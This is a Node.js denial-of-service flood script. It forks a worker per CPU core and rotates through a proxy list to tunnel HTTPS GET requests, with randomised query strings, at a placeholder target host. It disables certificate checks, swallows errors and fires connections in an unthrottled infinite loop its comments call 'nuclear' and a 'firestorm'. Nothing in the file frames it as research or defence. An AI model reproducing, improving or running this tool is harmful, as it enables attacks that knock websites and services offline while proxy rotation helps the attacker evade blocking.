const fs = require('fs');
const net = require('net');
const tls = require('tls');
const { randomBytes } = require('crypto');
const { cpus } = require('os');
const cluster = require('cluster');

const TARGET_HOST = 'your-domain.com';
const TARGET_PORT = 443;
const TARGET_PATH = '/?id=';
const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const CORES = cpus().length;
const SWITCH_INTERVAL = 5000;

if (cluster.isMaster) {
  for (let i = 0; i < CORES; i++) cluster.fork();
} else {
  let count = 0;
  let total = 0;
  let proxyIndex = 0;
  let proxy = PROXIES[proxyIndex];

  setInterval(() => {
    proxyIndex = (proxyIndex + 1) % PROXIES.length;
    proxy = PROXIES[proxyIndex];
  }, SWITCH_INTERVAL);

  // Japanese status line - updates in place
  setInterval(() => {
    process.stdout.write(`\r合計リクエスト送信数: ${total.toLocaleString()} `);
  }, 2000);

  function fire() {
    const [proxyHost, proxyPort] = proxy.split(':');

    try {
      const socket = net.connect(proxyPort, proxyHost, () => {
        socket.write(`CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\nHost: ${TARGET_HOST}\r\n\r\n`);

        const tlsSocket = tls.connect({
          socket,
          servername: TARGET_HOST,
          rejectUnauthorized: false
        }, () => {
          const req = 
            `GET ${TARGET_PATH + randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
            `Host: ${TARGET_HOST}\r\n` +
            `User-Agent: RawStorm/JP\r\n` +
            `Accept: */*\r\n` +
            `Connection: close\r\n\r\n`;
          tlsSocket.write(req);
          tlsSocket.end();
        });

        tlsSocket.on('error', () => {});
      });

      socket.on('error', () => {});
      socket.setTimeout(1000, () => socket.destroy());

      count++;
      total++;
    } catch {}
  }

  // Go absolutely nuclear: remove delay throttling
  const flood = () => {
    while (true) {
      for (let i = 0; i < 1000; i++) fire(); // 1000 at a time, tight loop
    }
  };

  // Instant firestorm
  setImmediate(flood);
}
